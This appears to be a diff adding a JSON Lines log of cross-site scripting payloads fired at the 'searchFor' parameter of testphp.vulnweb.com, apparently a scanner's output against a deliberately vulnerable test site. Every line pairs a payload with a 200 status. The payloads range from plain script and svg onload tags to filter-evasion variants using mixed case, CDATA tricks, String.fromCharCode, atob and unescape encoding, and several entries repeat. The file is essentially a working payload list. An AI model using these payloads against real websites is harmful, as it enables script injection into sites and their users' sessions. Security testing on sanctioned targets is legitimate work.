@@ -1,0 +1,58 @@
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>alert('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>confirm('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>prompt('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg onload=alert('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg onload=confirm('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe src=\"javascript:confirm('XSS')\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<body onload=alert('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<body onload=confirm('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><script>alert('XSS')</script></svg>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><script>alert`\\u0031`</script></svg> <!-- Template literal execution -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg> <!-- Bypasses naive tag filtering -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>setTimeout('alert(1)')</script> <!-- Delayed execution -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>alert('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>confirm('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>prompt('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg onload=alert('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg onload=confirm('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe src=\"javascript:confirm('XSS')\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<body onload=alert('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<body onload=confirm('XSS')>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><script>alert('XSS')</script></svg>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><script>alert`\\u0031`</script></svg> <!-- Template literal execution -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg> <!-- Bypasses naive tag filtering -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>setTimeout('alert(1)')</script> <!-- Delayed execution -->"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sCrIpT>alert(1)</sCrIpT>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sVg/onload=alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><iframe src=javascript:alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><svg><script>alert(1)</script></svg>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><body onload=alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>alert(1)</script><svg onload=alert(1)><img src=x onerror=alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>alert(1)</script><body onload=alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><iframe src=javascript:alert(1)></iframe><svg onload=alert(1)>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sCrIpT>alert`1`</sCrIpT>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sVg/onload=alert`\\u0031`>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sVg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>alert(1)</script><svg onload=alert(1)><img src=x onerror=alert(1)><iframe src=javascript:alert(1)></iframe><a href=javascript:alert(1)>Click</a>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sCrIpT>alert`1`</sCrIpT>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sVg/onload=alert`\\u0031`>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><sVg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><svg/onload=eval(unescape('%61%6c%65%72%74(1)'))>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>Object.defineProperty(Image.prototype, 'src', {set(){alert(1)}});new Image().src='x';</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>setTimeout('alert(1)')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>((()=>{alert(1)}))()</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>((function(){alert(1)}))()</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>new Function`alert(1)`()</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>setTimeout(()=>alert(1))</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>new Function('alert(1)')()</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>setInterval(()=>alert(1),1000)</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>location='javascript:alert(1)'</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>location.href='javascript:alert(1)'</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "\"><script>eval(atob('YWxlcnQoMSk='))</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>alert('XSS')</script>"}
+{"target_url": "http://testphp.vulnweb.com", "parameter": "searchFor", "status_code": 200, "payload": "<script>confirm('XSS')</script>"}
